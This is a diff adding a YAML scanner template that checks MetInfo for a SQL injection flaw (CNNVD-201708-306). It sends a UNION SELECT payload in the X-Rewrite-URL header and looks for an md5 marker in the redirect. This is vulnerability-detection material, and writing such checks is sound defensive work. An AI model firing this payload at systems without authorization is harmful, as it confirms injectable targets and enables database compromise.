@@ -1,0 +1,22 @@
+name: yaml-poc-metinfo-metinfo-sql_injection-CNNVD-201708-306
+binding: e4126a65-1073-441a-866e-8a64189ef983
+detail:
+    author: system_user
+    vulnerability:
+        id: 9084a21d-08e7-4116-a1f2-3ad684fd2209
+        level: low
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /index.php?lang=Cn&index=1
+            headers:
+                X-Rewrite-URL: 1/2/404xxx' union select md5({{r1}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php
+            follow_redirects: false
+        expression: response.headers["Location"].contains(md5(string(r1)))
+expression: r0()
